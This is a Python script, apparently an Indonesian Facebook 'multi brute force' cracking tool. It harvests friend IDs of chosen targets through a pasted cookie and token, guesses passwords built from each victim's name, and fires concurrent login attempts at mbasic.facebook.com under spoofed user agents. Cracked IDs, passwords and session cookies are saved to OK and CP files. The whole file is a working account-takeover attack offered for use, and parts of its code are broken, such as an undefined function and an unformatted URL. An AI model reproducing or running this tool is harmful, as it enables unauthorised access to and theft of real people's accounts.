#/usr/bin/python/27/Okt/2023#
#github.com/NdreeXyz/%s'%s-#
import requests,bs4,json,os,sys,random,datetime,time,re,platform
import urllib3,rich,base64
from time import time as tere
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from datetime import datetime
support = platform.platform()

pretty.install()
CON=sol()
proxxy = []
cokbrut=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
ses=requests.Session()
princp=[]

usragent = []
for xd in range(10000):
    a='CPU iPhone OS 15_0_2'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    d=random.randrange(1, 99)
    e='AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'
    f='phone;FBLC/it_IT;FBOP/5]'
    g=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}{g}')
    usragent.append(uaku2)
	
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
v = '\033[0m'
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
X = random.choice([m,k,h,u,b])

nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
date = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = 'OK-'+str(date)+'-'+str(days)+'-'+str(year)+'.txt'
cpc = 'CP-'+str(date)+'-'+str(days)+'-'+str(year)+'.txt'

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Pagi"
	elif 12 <= hours < 15:timenow = "Siang"
	elif 15 <= hours < 18:timenow = "Sore"
	else:timenow = "Malam"
	return timenow

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
def clear():
	os.system('clear')
def back():
	Masok_Puh()
		
def Masok_Puh():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()

def login_lagi334():
	try:
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		cookie = input(f'{x}[{b}•{x}]{kk} Cookie Luu {x}→ {hh}')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
				else:
					print('%sFailled Get Token%s'%(m, p))
			except:
				print('Failled Get Token')
		print(f'  {H} Berhasil Jalankan Lagi Perintahnya!!!! ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
				
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f'[{M}×{P}]{P}==================================={P}[{m}×{P}]')
	print(f' + Script Clone {K}Facebok{P} / Tools nmbf...+    ')
	print(f'[{M}×{P}]{P}==================================={P}[{m}×{P}]')
	print(f'{M}[{P}+{M}]{P} Welcome : {X}%s '%(my_name))
	print(f'{M}[{P}+{M}]{P} Waktu   :  {K}{waktu()} {H}')
	print(f'{M}[{P}+{M}]{P} Your ID : {H}%s {P}'%(my_id))
	print(f'{P}[{M}×{P}]-----------------------------------{P}[{M}×{P}]')
	print(f'{P}[ {P}Dump Publik {K}ON ')
	print(f'{P}[ {P}Cek Result {K}ON ')
	print(f'{P}[ {P}Out Ketik {M}[ {B}K{M} ]{P}       ')
	xyzii = input(f'\n{P}[{P} Pilih : ');banner()
	if xyzii in ['1']:
		dump()
	elif xyzii in ['2']:
		result()
	elif xyzii in ['K']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print(f'{hh}√{x} Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print(f'{P}[{P} Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{P}[ Maaf Fitur Ini Masih Di Perbaiki {P}')
	time.sleep(4)
	back()

def result():
	print(f'{P}[ {P}Hasil {B}OK{P} Anda ')
	print(f'{P}[ {P}Hasil {K}CP{P} Anda ')
	print(f'{P}[ {P}Kembali	')
	kz = input('\n{P}[ {P}Pilih {H}: ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[1]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()

def dump():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'\n{P}[ {P}Mau Berapa Target {H}TOD{x} ? : '));banner()
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'\n{P}[{P} Masukkan {hh}ID{x} Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit(f"{P}[{P} unstable signal ")
	try:
		print(f'{P}[ {P}Mengumpulkan {hh}ID...{P}')
		time.sleep(5)
		banner()
		print(f'\n{P}[{P} Berhasil Mengumpulkan{hh} ID {hh}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
	    exit(f"{P}[{P} gagal dump")
	except (KeyError,IOError):
		exit(f" {P}[{P} friendship not public {x}")
		time.sleep(3)
		back()
	
def setting():
	print(f'\n{P}[{P} Akun Old ')
	print(f'{P}[{P} Akun New ')
	print(f'{P}[{P} Random ')
	print('')
	hu = input(f'{P}[{P} Pilih : ');banner()
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('{M}!{X} Pilih Yang Bener Kontooll ')
		banner()

	print('\n\x1b[1;94m═════════════════════\x1b[1;97m')
	print(f'{x}| {b}Method Star Crack {x}|{x}')
	print('\x1b[1;94m═════════════════════\x1b[1;97m')
	print(f'{P}[{P} Method {b}Laknat{x} ')
	hc = input(f'{P}[{P} Pilih : ');banner()
	if hc in ['1','01']:
		method.append('mbasic')
	else:
		method.append('mbasic')
	
	#Password#
	Pass()
	
def Pass():
	print(f'{M}[ {P}Simple Multi Brute Force {M}]')
	print(f'{P}[{M}×{P}]==================================={P}[{M}×{P}]')
	print(f'{P}[ {P}   NdreeXyz // nmbf version 5.0 ....')
	print(f'{P}[{M}×{P}]==================================={P}[{M}×{P}]')
	print(f'{K}Warning{P} : {P}Use these tools appropriately') 
	print(f'{K}Use {P}: {P}Used for teasing')
	print(f'{P}[{M}-{P}]-----------------------------------{P}[{M}-{P}]')
	print(f'{P}[{P} Total {H}ID{P} TOD {P}: {H}'+str(len(id)))
	print(f'{P}[{P} AIRPLANE {b}MODE {P}IF NO RESULT ')
	print('')
	with tred(max_workers=30) as pool:
		for __xyzii__ in id2:
			idf,nmf = __xyzii__.split('|')[0],__xyzii__.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'00')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'00')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
			if 'mbasic' in method:
				pool.submit(crack_public,idf,pwv)
			else:
				pool.submit(crack_public,idf,pwv)
	print('')
	print(f'\t{P}[ Crack Selesai Ngab, Jangan Lupa Bersyukur {P}]')
	print(f'{P}[ {P}Hasil OK {H}{ok}{P} CP {K}{cp} {P}Yang Di Dapat Pada {K}{waktu()} {P}Ini')
	print('')
	print(f'{P}[ {P}Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input(f'{P}[{P} Pilih : ');banner()
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{K} Good Bye Dadaahh{x} ')
		time.sleep(2)
		exit()
		
def crack_public(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,u,b])
	sys.stdout.write(f"\r{P}[ {H}{loop}{P}|{U}{len(id)}{P} ]—{P}[{P}{ok}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			link = ses.get("https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr")
			data = {
			"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"uid":idf,
			"next":"https://mbasic.facebook.com/login/save-device/",
			"flow":"login_no_pin",
			"pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade = {
			"Host": "mbasic.facebook.com",
			"content-length": "324",
			"cache-control": "max-age=0",
			"dpr": "2.700000047683716",
			"viewport-width": "980",
			"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120"',
			"sec-ch-ua-mobile": "?1",
			"sec-ch-ua-platform": "Android",
			"sec-ch-ua-platform-version": "12.0.0",
			"sec-ch-ua-model": "21061119AG",
			"sec-ch-ua-full-version-list": '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
			"sec-ch-prefers-color-scheme": "light",
			"upgrade-insecure-requests": "1",
			"origin": "https://mbasic.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1",
			"sec-fetch-dest": "document",
			"referer": "https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in post.cookies.get_dict().keys():
				print(f'\r{P}[{M}×{P}] {M}{idf} {P}| {M}{pw}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = post.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}[{H}✓{P}] {H}{idf} {P}| {H}{pw}\n{P}*--> {K}{tahun(idf)}\n{P}*--> {H}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def banner():
	clear()
	print(f'''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                                 
 \x1b[1;91m _________                          .__   
\x1b[1;91m /   _____/____    ________________ |  |  
 \x1b[1;91m\_____  \\__  \ _/ ___\_  __ \__  \ |  |  
 \x1b[1;97m/        \/ __ \\  \___|  | \// __ \|  |__
\x1b[1;97m/_______  (____  /\___  >__|  (____  /____/
        \x1b[1;97m\/     \/     \/           \/ 
''')
	
def Selamat_Jalan():
	print('Selamat Jalan TOD')
	banner()
	exit()
	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	Masok_Puh()